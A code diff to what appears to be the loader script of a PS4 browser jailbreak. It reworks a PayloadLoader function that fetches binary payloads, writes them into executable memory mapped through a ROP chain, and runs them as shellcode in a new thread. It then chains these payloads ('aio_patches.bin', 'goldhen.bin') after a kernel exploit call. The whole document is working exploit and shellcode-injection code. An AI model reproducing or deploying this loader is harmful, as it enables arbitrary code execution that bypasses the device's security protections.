@@ -1817,57 +1817,100 @@ function array_from_address(addr, size) {
 
 function PayloadLoader(Pfile)
 {
-    var loader_addr = chain.sysp(
-  'mmap',
-  new Int(0, 0),                         
-  0x1000,                               
-  PROT_READ | PROT_WRITE | PROT_EXEC,    
-  0x41000,                              
-  -1,
-  0
-);
+    // Load each payload only after the previous one has been fetched and
+    // its loader thread has been started. This avoids the old immediate
+    // execution caused by setTimeout(PayloadLoader(...), 500).
+    return new Promise((resolve, reject) => {
+        try {
+            const req = new XMLHttpRequest();
+            req.responseType = "arraybuffer";
+            req.open('GET', Pfile, true);
+            req.timeout = 15000;
 
- var tmpStubArray = array_from_address(loader_addr, 1);
- tmpStubArray[0] = 0x00C3E7FF;
+            req.onerror = () => reject(new Error(`Payload request failed: ${Pfile}`));
+            req.ontimeout = () => reject(new Error(`Payload request timed out: ${Pfile}`));
+            req.onabort = () => reject(new Error(`Payload request aborted: ${Pfile}`));
 
- var req = new XMLHttpRequest();
- req.responseType = "arraybuffer";
- req.open('GET',Pfile);
- req.send();
- req.onreadystatechange = function () {
-  if (req.readyState == 4) {
-   var PLD = req.response;
-   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
-   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
-   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-   tmp.set(new Uint8Array(req.response), 0);
-   tmp.set(padding, req.response.byteLength);
-   var shellcode = new Uint32Array(tmp.buffer);
-   pl.set(shellcode,0);
-   var pthread = malloc(0x10);
-   
-    call_nze(
-        'pthread_create',
-        pthread,
-        0,
-        loader_addr,
-        payload_buffer,
-    );	
-   }
- };
+            req.onload = () => {
+                try {
+                    if (req.status !== 200 && req.status !== 0) {
+                        reject(new Error(`Payload HTTP status ${req.status}: ${Pfile}`));
+                        return;
+                    }
 
+                    const PLD = req.response;
+                    if (!(PLD instanceof ArrayBuffer) || PLD.byteLength === 0) {
+                        reject(new Error(`Empty or invalid payload: ${Pfile}`));
+                        return;
+                    }
+                    if (PLD.byteLength > 0x300000) {
+                        reject(new Error(`Payload too large: ${Pfile}`));
+                        return;
+                    }
 
+                    const loader_addr = chain.sysp(
+                        'mmap',
+                        new Int(0, 0),
+                        0x1000,
+                        PROT_READ | PROT_WRITE | PROT_EXEC,
+                        0x41000,
+                        -1,
+                        0
+                    );
+
+                    const tmpStubArray = array_from_address(loader_addr, 1);
+                    tmpStubArray[0] = 0x00C3E7FF;
+
+                    const payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+                    const pl = array_from_address(payload_buffer, PLD.byteLength * 4);
+                    const padding = new Uint8Array((4 - (PLD.byteLength % 4)) % 4);
+                    const tmp = new Uint8Array(PLD.byteLength + padding.byteLength);
+                    tmp.set(new Uint8Array(PLD), 0);
+                    tmp.set(padding, PLD.byteLength);
+                    const shellcode = new Uint32Array(tmp.buffer);
+                    pl.set(shellcode, 0);
+
+                    const pthread = malloc(0x10);
+                    call_nze(
+                        'pthread_create',
+                        pthread,
+                        0,
+                        loader_addr,
+                        payload_buffer
+                    );
+
+                    resolve();
+                } catch (error) {
+                    reject(error);
+                }
+            };
+
+            req.send();
+        } catch (error) {
+            reject(error);
+        }
+    });
 }
 
-kexploit().then(() => {
+kexploit().then(async () => {
+    log('Kernel exploit succeeded.');
 
-//Load ABC fix as a regular Payload
-setTimeout(PayloadLoader("aio_patches.bin"),500);
-log("AIO Fixes Applied.!");
-//Load GoldHEN :)
-setTimeout(PayloadLoader("goldhen.bin"),500);
-log("GoldHEN Loaded.!");
-if (typeof window.__goldhenStatusSuccess === "function") window.__goldhenStatusSuccess();
+    // Keep payload execution ordered: AIO compatibility patch first,
+    // then GoldHEN. Do not report success until both loader requests finish.
+    await PayloadLoader("aio_patches.bin");
+    log("AIO patch loader started.");
 
-}).catch(() => { if (typeof window.__goldhenStatusFailure === "function") window.__goldhenStatusFailure(); });
+    await new Promise(resolve => setTimeout(resolve, 500));
+
+    await PayloadLoader("goldhen.bin");
+    log("GoldHEN loader started.");
+
+    if (typeof window.__goldhenStatusSuccess === "function") {
+        window.__goldhenStatusSuccess();
+    }
+}).catch(error => {
+    log('Jailbreak/payload error: ' + (error && error.message ? error.message : String(error)));
+    if (typeof window.__goldhenStatusFailure === "function") {
+        window.__goldhenStatusFailure();
+    }
+});
